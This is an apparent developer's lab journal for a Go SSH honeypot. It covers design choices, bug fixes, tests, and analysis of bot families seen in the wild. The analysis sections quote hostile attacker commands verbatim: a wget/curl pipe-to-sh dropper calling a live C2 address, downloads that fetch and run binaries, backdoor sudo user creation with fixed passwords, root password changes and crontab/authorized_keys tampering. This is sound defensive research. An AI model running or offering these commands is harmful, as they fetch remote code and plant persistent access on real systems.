# NOTES.md
Lab Journal Decision Reasons

### Phase 1

**Picked / rejected:**

- Root packages no `cmd/` simple
- `slog` JSON logs for analysis
- `x/crypto/ssh` only real option
- `flag` stdlib enough
- Module path standard

### Phase 2 Iteration 1

**Picked / rejected:**

- Walking skeleton fast feedback
- Minimal packages from start
- Config `Addr` only
- Logger `io.Writer` clean
- Ephemeral ed25519 key
- Reject all auth first
- Basic auth log fields
- `server.Options` struct

**Skipped:**

- Tests
- File logs
- Graceful shutdown

**Notes:**

- Learned closures logging
- SSH errors show all attempts

### Phase 2 Iteration 2

**Picked / rejected:**

- Accept all auth
- Log before return
- Only session channels
- Goroutine per channel
- Parse request structs

**Skipped:**

- No shell
- No tests

**Notes:**

- Must drain reqs
- `ssh.Unmarshal` ok

### Phase 2 Iteration 3

**Picked / rejected:**

- Byte loop raw input
- Manual echo CRLF
- Simple buffer
- Flat command map temp
- Fake system fixed

**Skipped:**

- No dynamic cmds
- No args
- No tests

**Notes:**

- CRLF bug
- Slice logic clicked

### Phase 2 Iteration 4

**Picked / rejected:**

- `Cmd` interface
- Registry map
- Args handled inside
- Grouped files
- `sudo` fake root
- Real exit codes

**Skipped:**

- No cwd
- No capture
- No tests

**Notes:**

- Building attacker UX

### Phase 3 Iteration 1

**Picked / rejected:**

- 3 log files
- Append mode
- `log dir` flag

**Skipped:**

- No rotation
- No correlation

**Notes:**

- Cleanup on error
- `slog = writer`

### Phase 3 Iteration 2

**Picked:**

- Persistent ed25519 key

**Why:**

- Scanners fingerprint
- Restart key change is a tell

**Tradeoff:**

- Key theft low risk

**Skipped:**

- No rotation
- Reading

### Phase 1 (Summary)

- Honeypot levels
- SSH auth
- `crypto/rand`
- Key strategy

### Phase 2 (Summary)

- Channels risks
- Wire format
- Fingerprint

### Phase 3 (Summary)

- Terminal modes
- Fake system consistency
- Attack scripts flow

---

### Pre-deploy session

**Picked / rejected:**

- Multi-password per connection: reject first 3, accept on 4th
- `sync.Mutex` + `map[string]int` keyed by `c.SessionID()` for per-connection counts
- `Handle` returns `string` (session ID) so the goroutine can clean up the map after disconnect
- `MaxAuthTries: 6` set explicitly so library doesn't cut off clients before the 4th attempt
- `go mod tidy` -- x/crypto was marked `// indirect`, fixed to direct
- Public key auth: not logged at all, no `PublicKeyCallback` set -- silent drop

**Skipped:**

- `PublicKeyCallback` -- bots rarely use pubkey, adding later
- `AuthLogCallback` -- would catch all methods but less detail per attempt

**Notes:**

- Multiple `ssh.Password()` entries in the client config do NOT retry -- SSH client
  marks the "password" method exhausted after the first server rejection. Need
  `RetryableAuthMethod` + `PasswordCallback` with a cycling closure to test N attempts.
- `net.Pipe()` deadlocks for SSH tests: both sides write the version string before
  reading, synchronous pipe means neither can proceed. Use real TCP (`net.Listen` on :0).
- Unit-testing the callback directly with a fake `ssh.ConnMetadata` is cleaner than
  going through a full handshake for the counter logic.
- Bots that only try 1-2 passwords per connection now get rejected and reconnect.
  The `"attempt"` field in auth.log lets you correlate sessions from the same IP.

**Tests added:**

- `hostkey`: LoadOrGenerate creates file, reloads same key
- `logger`: files created, Close no error, writes land on disk
- `session/cmd_test.go`: table-driven for 24 commands + 8 individual edge cases
- `server`: 2 unit tests (callback counter, session isolation) + 1 integration test

---

### Post-deploy bug fix

**The bug:**

Deployed the honeypot, 329 auth attempts in 4h, only 2 got a shell -- both from a
human tester. Every real bot was rejected on every attempt.

Root cause: the attempts map was keyed by `c.RemoteAddr().String()` which returns
`IP:port`. Bots open a fresh TCP connection per password guess, each connection uses
a different ephemeral source port, so the counter key changed every time and n was
always 1. Nobody ever reached the threshold.

Second bug found during fix: the goroutine cleanup ran `delete(attempts, host)` after
every connection close, which wiped the counter even when using IP-only keys. Had to
change it to only delete when `attempts[host] >= 10` -- otherwise counter still resets.

**Fixed:**

- Key by IP only: `net.SplitHostPort` strips the port
- Cleanup only on accept: `if attempts[host] >= 10 { delete }`
- Threshold bumped 2 -> 10: harvest more passwords before letting bot through
- `MaxAuthTries` bumped 6 -> 20 to match

**Tests added to catch regressions:**

- `TestCallbackAccumulatesAcrossConnections`: same IP, 10 different ports, n must go 1..10
- `TestCallbackResetsOnlyAfterAccept`: cleanup must not wipe counter on rejected connections
- `TestIntegrationThresholdAcrossConnections`: real `Serve()`, 10 sequential TCP connections,
  connection 10 accepted -- this is the test that caught the cleanup bug live

**Verified on VPS:** attempts 1-9 rejected, attempt 10 accepted, attempt 11 rejected (reset).

---

### First findings + bait + scp receive

**What we saw in the logs (first ~6h, Helsinki VPS):**

541 auth attempts from 10 IPs. Almost all `SSH-2.0-Go` banners -- mass scanners
written in Go, credential stuffing with dumb passwords (123456, 1, 123).

Two distinct bot types once they got a shell:

1. **Crypto miner recon** -- ran `uname -s -v -n -r -m`, `nproc`, `lspci | grep 3D`,
   `uname -m`. Checking OS + CPU count + GPU. The `lspci | grep 3D` is the GPU check,
   that's what tells it whether to deploy a miner. Ran the same script 11 times.

2. **Dropper bot** -- `mkdir /lib/<random10chars>` then `scp -t -r /lib/<random10chars>/`
   repeated 10 times with different directory names. `scp -t` is server-side SCP receive --
   the bot was trying to upload a payload from its own machine. We returned exit 1 so all
   10 attempts failed.

**Bait added:**

- `nproc` -> 8 (was "command not found")
- `lspci` -> fake PCI list with `Tesla T4` GPU entry (3D controller line)
- `uname -s -v -n -r -m` -> handled the multi-flag case the bot actually sends
- Miner bot now sees a 8-core GPU machine. Should try harder.

**SCP receive -- option A chosen (exit 0, capture the playbook):**

`scp -t` now speaks the SCP wire protocol server-side: sends `\x00` ready byte,
parses C/D/E headers, drains file data with `io.LimitReader`, acks each step, exits 0.
Bot thinks upload worked -> will proceed to `chmod +x` + execute -> we see that in session.log.

Shell path (bot types `scp -t` in interactive shell): `scpCmd.Run` returns exit 0 when
`-t` flag present. Can't do the wire protocol over the line-buffered shell, but exit 0
is enough to keep the bot moving.

Rejected option B (permission denied) -- would have stopped the bot before we saw its
next step. The point is to capture the full playbook.

**Tests:**

- `isSCPReceive`: 8 cases, flag in various positions
- shell path: `-t` exits 0, no `-t` exits non-zero with "unreachable"
- exec path: single file transfer, recursive dir, empty stream
- `fakeChan` struct implements `ssh.Channel` with in-memory buffers

**Integration test:**

`verify/dropper_sim.go` -- connects to live honeypot, loops until accepted, speaks
full SCP protocol, checks all ack bytes are `\x00`, verifies exit 0.
Verified on VPS_IP:2222 after deploy -- accepted on attempt 6 (counter was
partially accumulated), full exchange completed.

**What to watch for next:**

- `chmod +x` + execute after scp -- means the upload path worked
- `curl`/`wget` with a real C2 URL in session.log -- that's the money finding
- `crontab`, `systemctl` -- persistence phase

---

### I-2: stateful virtual filesystem

**Picked:**

- `Session` struct per connection: `cwd`, `fs map[string][]byte`, `dirs map[string]bool`
- `mkdir`, `touch`, `rm`, `cd`, `pwd` all mutate/read session state
- `ls` checks session FS first, falls back to hardcoded for `/` and home
- `cat` checks session FS first -- uploaded files visible after scp
- `scp` writes received file path into `sess.fs` so `ls /tmp` shows it
- `/bin/echo` added to `fakeFiles` as ELF magic bytes -- closes T2

**Rejected:**

- global FS state -- per-session is cleaner and avoids cross-session leaks
- persistent FS across reconnects -- not worth the complexity

---

### && operator + redirect stripping

**Picked:**

-  `dispatchSegment` holds pipe logic, `dispatch` loops on `&&` segments
- stop on first non-zero exit -- bash `&&` semantics
- `> /dev/null` stripped before dispatch so echo-then-cat chains work
- `egrep` registered as alias for `grep`

**Why:**

- Diicot runs `lspci | egrep VGA && lspci | grep 3D` -- was getting "command not found" on `egrep`, whole command failed, bot never escalated
- ELF checker bots use `echo 1 > /dev/null && cat /bin/echo` -- same `&&` + redirect issue

**Rejected:**

- inlining `&&` split inside `dispatch` without helper -- harder to test

---

### I-4: real pipe execution

**Picked:**

- `dispatch` splits on `|`, feeds each stage stdout into next stage stdin
- `Cmd` interface gains `stdin string` and `sess *Session` params
- `grep` filters stdin lines, joins multi-word patterns (handles shell quoting split by Fields)
- `wc` counts lines/words/bytes in stdin
- `head -c N` slices first N bytes of stdin
- `awk` with `{print $1}` / `{printf $1}` extracts first field; no-arg passes stdin through
- full Diicot recon pipeline now works end-to-end: `nvidia-smi -q | grep "Product Name" | awk | wc -l | head -c 1` -> `1`

**Rejected:**

- semicolon chaining -- not in scope, pipes cover the capture data

---

### I-8 + I-10: analysis scripts

**Picked:**

- `analysis/sessions.py` -- groups events by `sid`, renders per-session Markdown timeline
- `analysis/timeline.py` -- first/last-seen per password and command, flags chpasswd overlap (credential loop)

---

### I-3: missing commands

**Picked:**

- `nvidia-smi` with real Tesla T4 output for bare, `-q`, `-L` -- closes T1
- `killall`, `chattr`, `disown`, `chpasswd` as exit-0 noops -- closes T4
- `awk`, `wc`, `head`, `grep` and others registered -- no pipe support yet so they're stubs
- `fakeBinaries` updated so `which`/`whereis` return real paths

**Rejected:**

- making `awk`/`wc`/`head` do real text processing -- pointless without pipes (I-4)

---

### I-1: payload quarantine

**Picked:**

- `--quarantine-dir` flag, empty = disabled, dir created at startup
- `filepath.Base` on attacker-supplied filename -- path traversal kill
- 50MB cap before saving, drain rest to discard so protocol stays intact
- `<sha256>-<name>.bin` naming -- deduplication is free

**Rejected:**

- hardcoded path next to log-dir -- wanted operator control
- saving to discard on any error -- kept as fallback, not default

---

### analysis tooling session

**report.py:**

- rich terminal report with ANSI colors, `--no-color` for txt output
- hourly heatmap (ASCII bar chart)
- kill-chain phase tagging per command: RECON / STAGE / UPLOAD / EXEC / PERSIST / CLEANUP
- bot family fingerprinting: Diicot = lspci + nproc + scp -t to /lib/ dirs
- session narrative: one sentence per session ("fingerprinted GPU, CPU cores. tried SCP upload 3x.")
- sequential password pattern detection (1 -> 12 -> 123 -> 1234...)
- credential feedback loop: IP keeps trying after first shell accept

**Rejected:**

- merging into sessions.py -- different output format, different audience

**analyze.sh:**

- local-only wrapper, one arg: log dir
- runs all 4 scripts, result-HHMM--DD-MM naming
- `result-*.txt` in .gitignore

**Findings from logs (2026-05-28):**

- 71.227.179.172: 1545 unique passwords, 1382 attempts after first shell accept -- credential feedback loop confirmed in the wild
- 22:00 UTC spike: 1238 attempts in one hour -- coordinated spray window
- SSH-2.0-Go dominates client banners -- scanning ecosystem is almost all Go

---

### quarantine audit + SCP bug + w.sh bot (2026-05-30)

**Quarantine IS enabled and working -- but captured 0 real attacker payloads.**

systemctl output truncated the ExecStart line, the --quarantine-dir flag is present.
One file captured: scp_test_payload.sh.bin (27 bytes, 2026-05-28 22:39) -- our own
dropper_sim.go test run. Mode r--------, honeypot-owned. That is correct behavior.

**SCP sessions breakdown (verified by inspecting session.log msg types per sid):**

Session d22ff677d5 (real attacker, 2026-05-26 17:50, 11 SCP attempts):
  msgs: channel request, exec -- only. NO scp receive, NO scp file, NO scp data drained.
  The SCP wire protocol was never spoken.

Sessions e30b8bd4ff, 2d1b80adfb (dropper_sim.go, 2026-05-27 00:49):
  msgs: channel request, exec, scp receive, scp file, scp data drained.
  Wire protocol was spoken. No payload saved -- quarantine not enabled at that point.

Session 84e0a852af (dropper_sim.go, 2026-05-28 22:39):
  msgs: channel request, exec, scp receive, scp file, scp payload saved, scp data drained.
  Wire protocol spoken + quarantine enabled = only real captured file.

The 4 sessions in report.py alert = 1 real attacker + 3 our own tests.

**Bug found: interactive shell SCP path is broken.**

When the real attacker bot typed `scp -t -r /path/` at the interactive shell prompt,
the shell handler called scpCmd which returns exit 0 -- but never sends the \x00 ready
byte that the SCP protocol requires before the client sends file data. The attacker's
scp client on the other end was waiting for that byte, got nothing, timed out or hung.

The upload never started. The bot thought it succeeded (exit 0) but the protocol
handshake was incomplete. This is why 0 real payloads were captured.

The exec channel path (dropper_sim.go) correctly calls runSCPReceive which speaks the
full wire protocol. The shell path does not. These are two different code paths.

Fix needed: when `scp -t` comes through the interactive shell, engage the wire protocol
handler (runSCPReceive) instead of returning a plain exit 0.

**New bot family: w.sh / astats (appeared 2026-05-29 14:17 under threshold=1)**

Most sophisticated persistence seen. Botnet spray, different IP every ~30-45min.

Kill chain:
1. Find writable dir: tries /dev/shm, /tmp, /var/run, /mnt, /root, / in order
2. Drop w.sh to /tmp, chmod +x
3. Cron persistence: adds /tmp/w.sh "astats" "netai" "kstats" to crontab
4. Systemd user service: ~/.config/systemd/user/watcher-netai.service
5. Check if already running: ps aux | grep astats
6. Drop miner binary named astats to /dev/shm or /tmp

Two persistence mechanisms simultaneously. Process names (astats, netai, kstats) look
like monitoring tools in ps aux. Zero sessions before threshold=1 -- single-shot family.

**Period 8 numbers after 22h (87.6h total):**
- 143 attempts, 41 IPs, 27 single-shot (66%), 143 accepted, 234 commands
- +3800% commands vs period 7, +1688% accepted, +440% single-shot
- kill-chain: RECON=119 OTHER=75 STAGE=24 EXEC=12 PERSIST=4

**Bugs to fix (next session):**

- Interactive shell SCP path: returns exit 0 without wire protocol -- bots using interactive
  shell cannot actually upload. Fix: call runSCPReceive from shell dispatch when scp -t seen.
- Double-logging: every exec command logs as both "channel request" and "exec". Scripts dedup
  but log is 2x larger than needed.
- crontab is a noop: w.sh bot checks crontab -l to see if its entry exists. A stateful
  crontab would reveal more of the bot's dedup logic.

**Experiments worth running (next session):**

- Fake wget/curl logging the URL argument: C2 dropper at 14.46.136.77/sh hits every hour.
- Switch back to threshold=10 for 48h: give the blog post a clean controlled comparison.

---

### full session analysis -- bot families (2026-05-29)

**687 unique commands, 235 sessions, 72h total.**

---

**Diicot GPU miner -- dominant family (~180 sessions, 2026-05-26/27)**

Same recon script every time:
```
uname -s -v -n -r -m
nproc
lspci | egrep VGA && lspci | grep 3D
uname -m
```
Advanced variant adds nvidia-smi pipeline then the kill chain:
```
crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; rm -rf /dev/shm/.x /...
```
Wipes crontab, locks authorized_keys with chattr (competing attackers can't add SSH keys), kills other miners, deploys. Our fake Tesla T4 GPU response triggered the deployment stage. The bait worked.

---

**SCP dropper -- payload uploader (2026-05-26 17:50, one session)**

Tried 11 directories in sequence looking for a writable path:
/lib/, hidden dir, /dev/, /dev/shm/, /var/volatile/, /tmp/, /sys/, /var/lib/, /root/, /etc/, /var/log/
Each: mkdir <random10chars> then scp -t -r <dir>/. Honeypot returned exit 0 on all -- bot thought it succeeded. Nothing uploaded. This is the same family from earlier, now confirmed as systematic directory bruteforce.

---

**Password changer -- persistence bot (2026-05-26 22:xx - 2026-05-27 01:xx)**

Pattern: uname -a -> cat /etc/passwd -> passwd -> echo 'root:STRONGPW' | chpasswd
Passwords seen: i5n#_o$_6qFK!$s and $MWtB6=$e6mK#=E (both strong random).
Goal: lock out other attackers by changing root password. Tries interactive passwd first (fails in our shell), falls back to chpasswd pipe -- designed for real systems. Classic attacker move to claim exclusive access.

---

**C2 dropper -- fileless exec (2026-05-29, new, threshold=1)**

```
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh
```
auth_ok beacon (hex = "auth_ok\n") then pipe-to-sh from 14.46.136.77. Fileless -- nothing written to disk. Came via exec channel (invisible to old analysis). Hit 4+ times today from different IPs, same C2 -- botnet spray. Most dangerous pattern seen so far.

---

**VPS assessor -- infrastructure scout (2026-05-29 09:48, one session)**

35 commands: package managers (apt/yum/pacman/zypper), shadow file read, disk I/O benchmark (dd bs=1M count=10), network interfaces, running services, connectivity check. Profiling the machine for deployment suitability. Did not deploy anything -- pure reconnaissance.

---

**Volume breakdown:**
- 2026-05-26: 88 commands -- initial wave, mixed families
- 2026-05-27: 545 commands -- Diicot heavy day
- 2026-05-28: 10 commands -- genuinely quiet, not a script bug
- 2026-05-29: 44 commands so far -- new families, C2 dropper

2026-05-28 quiet period is real. The "command drought" in the analysis was partly the exec blind spot and partly actual silence.

---

### exec channel blind spot + live dropper (2026-05-29)

**Bug found: report.py and periods.py both undercount commands.**

session.log has two msg types with a `command` field:
- `"shell"` -- interactive shell (bot typed commands)
- `"exec"` -- one-shot SSH exec (bot ran `ssh host cmd` without opening a shell)
- `"channel request"` -- logged again in logRequest() before dispatch, so every exec command appears twice

report.py and periods.py only count `msg == "shell"`. This is why period 8 showed "0 commands" and the overall report showed "10 commands" -- it was missing 679 exec-channel commands entirely. Real count on 2026-05-29: 44 unique commands, 92 log entries.

**Root cause in code:** `logRequest()` logs the command as `"channel request"`, then `runExec()` logs it again as `"exec"`. Fix: pick one, or filter in analysis scripts to avoid double-count.

**Fix needed:** report.py and periods.py should count `msg == "exec"` OR `msg == "shell"`, not just shell. Dedup by (sid, command) to avoid double-count from channel request.

---

**Live dropper seen today (2026-05-29, threshold=1):**

```
uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh
```

- hex = "auth_ok\n" -- C2 beacon, signals to controller that auth succeeded
- downloads and pipes `14.46.136.77/sh` directly into sh (no file written to disk)
- `-s ssh` tells the script the entry vector
- came in via exec channel (not interactive shell) -- invisible to old analysis
- hit 4+ times today from different IPs, same payload, same C2 -- botnet spray

**VPS assessment bot (sid e1877e76, 2026-05-29 09:48):**

35 commands in one session: package managers (apt/yum/pacman/zypper), shadow file read attempt, disk speed (dd), network config, systemd services, connectivity check (ping 8.8.8.8). Infrastructure scout, picking candidates for mining deployment.

**Why bursty:** periods 5-7 had 0 commands in the analysis because exec-channel commands weren't counted. Real data shows activity was continuous, just invisible. The "command drought" was a lie from a broken script.

---

### auth-threshold flag + analysis period tooling

**Picked:**

- `AuthThreshold int` config flag, default 1 (accept immediately)
- logs `auth_threshold` at startup in server.log -- period anchor for analysis tool
- guard in `Serve()`: clamp to 1 if unset, avoids silent "n >= 0 always true" footgun
- analysis tool will split log periods by reading the "listening" events in server.log

**Why threshold=1 now:**

- data from VPS shows most IPs try exactly once then leave
- threshold=10 was harvesting passwords but missing all post-auth commands from single-shot bots
- keeping the flag so we can flip back to 10 and compare credential spray data vs shell data

**Rejected:**

- hardcoding 1 -- wanted the option to go back without a code change

---

### new families: SSHCHK + minimal OS scanner (2026-05-30, Rabat)

**93.5h total. 3297 attempts, 180 IPs, 880 commands.**

**Family 8 -- SSHCHK liveness checker (02:20 and 02:23 UTC, 2 sessions)**

Full command:
```
echo SSHCHK_5718926f9304_BEGIN; uname -srm; echo $((7*191+3)); hostname; df -P / 2>/dev/null | awk 'NR==2{print $1}'; echo SSHCHK_5718926f9304_END
```

Most sophisticated C2 interaction seen so far. Four components:

- SSHCHK_<token>_BEGIN / _END: structured framing. C2 extracts everything between these
  markers. Unique hex token per session -- prevents replay attacks and correlates output
  to this specific connection.
- uname -srm: OS name + release + arch in one call
- echo $((7*191+3)) = 1340: arithmetic proof-of-work. Shell must evaluate the expression.
  A static replay or a broken shell returns something else. Confirms live interactive shell.
- df -P / | awk 'NR==2{print $1}': root filesystem device name (/dev/sda1 etc). Disk check.

Two sessions, different IPs (SSH-2.0-Go), 3 minutes apart. Same tool, different botnet nodes.
No follow-up commands -- the C2 reads the output and decides what to do next (externally).
This is a pure inventory/assessment probe. The most careful liveness check in the dataset.

**Family 9 -- Minimal OS scanner (06:03 and 07:39 UTC, 2 sessions)**

Command: uname -s -m (just that, nothing else)
Clients: SSH-2.0-Go, different IPs, 1h36m apart.

Returns "Linux x86_64". Bot disconnects immediately after. Pure OS/arch check -- if not
Linux x86_64, the bot never sends a payload. Lightest possible post-auth probe.
Could be a first-stage probe before a payload bot follows up, or a cataloguing scanner.

---

### SCP fix + quarantine uncertainty (2026-05-30)

**Fixed: interactive shell SCP path now sends the \x00 ready byte.**

Before: scpCmd.Run() returned ("", 0) without speaking the wire protocol. The attacker's
scp client was waiting for \x00, got nothing, timed out. Upload impossible by design.

After: runShell detects isSCPReceive before dispatch and hands the channel to runSCPReceive
which speaks the full wire protocol. Required adding quarantineDir param to runShell.

**Will quarantine capture real payloads now? Uncertain.**

Depends on how the attacker bot is implemented:
- If the bot is SCP-aware (expects \x00 and sends file headers on the same connection):
  yes, payload lands in quarantine.
- If the bot is a dumb script (just types commands at a shell, doesn't switch to SCP mode
  after seeing \x00): it sees the byte as terminal output and moves on. Nothing uploaded.

The exec channel path (dropper_sim.go) is guaranteed to work -- the SCP client on the
other end is explicitly in SCP mode. Interactive shell path depends on the attacker's
implementation. Will know after next deploy when SCP dropper hits again.

---

### wget/curl URL logging (2026-05-30)

**Experiment : capture C2 dropper URLs.**

Added `log *slog.Logger` to Session struct. Set in Handle() after the sid is assigned
so the URL log entries carry the same sid as the rest of the session.

wget and curl now call sess.log.Info("wget fetch"/"curl fetch", "url", url) before
returning the fake error. Guard: sess != nil && sess.log != nil so dispatch() calls
from tests (no real session) don't panic.

When the C2 dropper runs:
  wget --no-check-certificate -qO- https://14.46.136.77/sh | sh -s ssh
session.log will have: {"msg":"wget fetch","url":"https://14.46.136.77/sh","sid":"..."}

The URL can then be looked up on Shodan/VirusTotal to identify the C2 infrastructure.

---

### bait for family 8 (SSHCHK) and family 9 (minimal scanner) (2026-05-30)

**Family 9 -- uname -s -m:**
Was returning "Linux\n". Added "-s-m" and "-sm" cases to unameCmd switch.
Now returns "Linux x86_64\n" -- the minimal OS scanner gets the right answer.

**Family 8 -- SSHCHK full command fix (4 issues):**

1. uname -srm: added case, returns "Linux 6.8.0-49-generic x86_64\n" (kernel+release+machine).

2. echo $((7*191+3)): implemented $((expr)) arithmetic expansion. Added evalArith()
   recursive descent parser in commands.go (handles +, -, *, / with correct precedence).
   expandVars now runs expandArith before os.Expand. $((7*191+3)) -> 1340.
   The SSHCHK proof-of-work now returns the correct answer -- C2 thinks it has a real shell.

3. awk 'NR==2{print $1}': awk was applying {print $1} to ALL lines. Added nrRe regex to
   detect NR==N condition and skip all other lines. Now df -P / | awk 'NR==2{print $1}'
   correctly returns "/dev/vda1".

4. df -P /: added -P flag handling. Returns POSIX format (512-blocks header, one line for
   root fs only). Required because awk NR==2 needs exactly 2 lines with the device on line 2.

**Hidden bug found and fixed:**
expandVars was calling os.Expand which mapped $1, $2 etc to "" (not in fakeEnv). This
silently destroyed awk field references before the awk command ever saw them. Fixed by
preserving $N where N is a digit -- return "$"+k instead of fakeEnv[k] for numeric keys.

---

### family 10 -- ELF echo injector (2026-05-30 11:18 UTC)

Appeared 17 minutes after new binary deployed. Single session eb342541b5.

Kill chain:
1. uname -s / uname -m -- arch check
2. wget then curl from two C2 servers (redundancy):
   - 195.177.94.72:564/b/amd64
   - 45.88.91.135:35146/b/amd64
3. when downloads fail (our fake wget/curl return errors): falls back to writing
   the binary directly as hex via 407 echo -e -n chunks (~6.5KB ELF binary)

The entire amd64 binary is hardcoded in the command sequence as hex bytes.
Designed for environments where outbound HTTP is blocked -- the bot carries its
payload inside itself. Classic technique for restricted networks.

URL logging confirmed working -- both C2 URLs appear in session.log.

**Family 10 explanation (for blog post / learning):**

The bot carries its own payload. When HTTP is blocked it writes the binary byte by byte
via echo -e -n hex chunks. 407 commands = ~6.5KB ELF binary reconstructed from shell
commands alone. The \x7f\x45\x4c\x46 prefix is the ELF magic number -- every Linux
executable starts with these 4 bytes. This is called in-band payload delivery.

17 minutes after deploy -- that is how fast these bots scan the whole internet.
Fresh IP, new port, doesn't matter. They find you almost instantly.

---

### family 10 live session -- still writing (2026-05-30 ~12:45 Rabat)

Session eb342541b5 has been injecting ELF hex chunks for 27+ minutes.
14,760 unique echo commands logged, ~236KB binary being written byte by byte.
Session is live right now as of 12:45 Rabat. I'm genuinely suprised it's still going -- the bot is patiently writing the binary out over a slow connection, not giving up byte by byte. :) idk why but this is making me smile.

Waiting for the session to end to see if it runs chmod +x and executes.
No risk to VPS -- fake shell, nothing executes, binary goes to in-memory session FS.

wanted to take a nap but the bot is still going and i genuinely can't stop watching.

**Session eb342541b5 finished at 12:56 Rabat (38 minutes total).**

After 21,450 echo chunks the bot ran:
  chmod 777 /tmp/amd64
  /tmp/amd64
  rm -f amd64

Then immediately tried to fetch kal64 from the same two C2 servers. Both failed (fake wget)
-  wget/curl http://195.177.94.72:564/b/kal64                           
-  wget/curl http://45.88.91.135:35146/b/kal64    
So it started injecting kal64 the exact same way -- byte by byte via echo. Still going.

VPS scout also showed up at 13:00 Rabat (session 38764bf24d), same 35-command sequence, different IP.
Came right after amd64 executed -- same botnet probably, one part injects the miner, another scouts.

At 13:05 Rabat: eb342541b5 at 32,254 echo chunks and counting. That's kal64 now. Not giving up.

---

### family 10 -- binary captured, not yet analysed (2026-05-30)

C2 URLs:
- 195.177.94.72:564/b/amd64 and /b/kal64
- 45.88.91.135:35146/b/amd64

Source IP: 152.89.61.139 (Ukraine)

The bot dropped two binaries: amd64 (~343KB injected via echo) and tried to fetch kal64.
I can download them directly from the C2 servers (still live).

I don't know how to analyse them properly yet. Need to learn how to analyse the two binaries -- the echo-injected amd64 and the fetched kal64. They are likely a dropper and a miner, but I want to confirm that by looking at the code. This will be a learning experience in reverse engineering Linux malware.
Total session duration: 38 minutes. Longest single session in the dataset.

kal64 finished and executed too. Now injecting a third binary called kswpad into /etc/.
37,421 echo chunks total so far. Last entry 13:26 Rabat. Still going.

kswpad finished, executed (pkill kswpad first to kill previous instance), deleted at 13:27.
fourth binary now: linux into /tmp. executed at 13:36, deleted. 43,058 echo chunks total.

linux executed and deleted at 13:36. session ended. nothing new at 13:40.

full session eb342541b5: 12:18 to 13:36 Rabat -- 78 minutes, 4 binaries deployed in sequence.
amd64 -> kal64 -> kswpad -> linux. each one written byte by byte via echo when download failed,
executed, deleted, then moved to the next. 43,058 echo chunks total across all 4.

i have all 4 binaries i can reconstructe them from the session logs (amd64, kal64, kswpad, linux).
idk how to properly analyse them yet

---

### session 2026-05-31 morning

Set up notify.sh + cron (every 4h, aligned to 05:43 UTC). Pulls logs from VPS, sends HTML diff email via notify.py. stats.py output too large for Gmail raw -- trimmed to summary + top sections before sending.

Family 10 hit twice today. Session c523e246ab55: started May 30 23:29 UTC (log rotated under it), ended 00:38 UTC -- full 1h 9min, not 38min as today's log suggested. Lesson: always check .gz archive. Session eadedac033be: started 09:37 Rabat, same 4-binary kill chain (amd64 -> kal64 -> kswpad -> linux), same two C2s but /s/ path instead of /b/. Still running at close (1h 18min+).

Family 11 (meow dropper) confirmed: two hits at 02:09 and 02:12 Rabat, C2 34.11.111.237, backdoor users admin1+user1 with modzmodz, /tmp/mew differs between hits. Not yet analysed.

---

### ELF echo injector session -- 2026-05-31

Session c523e246ab55 looked like 38 minutes (today's log only). Pulled yesterday's rotated log (session.log.1.gz) and found the real start. Full session: 00:29 to 01:38 Rabat = 1h 9min. Log rotation at midnight UTC split it in half. Lesson: always check the .gz archive before reporting session duration.

---

### TODO: meow dropper (family 11) -- 2026-05-31

New family appeared today. Downloads meow + meowarm64 from 34.11.111.237, creates backdoor sudo users (admin1, user1) with password modzmodz, changes current user password, writes root credential to /tmp/mew. Two hits, different trailing password (root:webserver vs root:fuck123) -- same C2, two operators or parameterized campaign. Analyse the binary and the /tmp/mew credential harvesting logic.

---

### logrotate incident + fix -- 2026-05-31 afternoon

Weekly logrotate triggered at midnight UTC and rotated session.log. The honeypot kept
writing to the new file (copytruncate, same fd), but server.log got wiped. The report
showed only 12 hours of data instead of the full history.

Recovery: full history was in session.log.1.gz on the VPS (pre-midnight chunk) + the
live session.log (post-midnight). Also had the local pull at 00:47 Rabat which had the
complete server.log with all restart history from May 26. Merged into full-merged/ and
the full 121h dataset was intact.

Fix: rewrote /etc/logrotate.d/ssh-honeypot -- daily rotation, 60 rotates, dateext
(archives named session.log-2026-05-31.gz), delaycompress. Verified with --debug.
Next rotation at midnight will produce dated archives, no more ambiguity.

Lesson: always pull *.gz alongside *.log. The .gz has the pre-rotation history.

---

### family 11 (meow dropper) -- observed, not yet analysed

Kill chain from session.log (two sessions, 01:09 and 01:12 UTC May 31):

```
cd /tmp; ulimit -n 1020000; rm -rf meow*
wget http://34.11.111.237/meow; chmod 777 meow; ./meow
wget http://34.11.111.237/meowarm64; chmod 777 meowarm64; ./meowarm64
echo $(whoami):modzmodz | chpasswd
useradd -m -s /bin/bash admin1; echo admin1:modzmodz | chpasswd; usermod -aG sudo admin1
useradd -m -s /bin/bash user1;  echo user1:modzmodz | chpasswd
echo -n 'root:webserver' > /tmp/mew   # second hit: root:fuck123
```

What I know from the logs: drops both x86 and ARM64 binaries (multi-arch, covers both
without fingerprinting), creates two backdoor sudo users, changes the current user's
password, writes a credential string to /tmp/mew. The /tmp/mew payload differs between
the two hits -- probably parameterized per campaign or per operator.

What I don't know yet: what meow and meowarm64 actually do (no binary analysis done),
what /tmp/mew is used for (credential exfil? local storage?), who runs this campaign.

TODO: download meow from 34.11.111.237 if still live, strings + file + readelf, check
if C2 is on any blocklists.
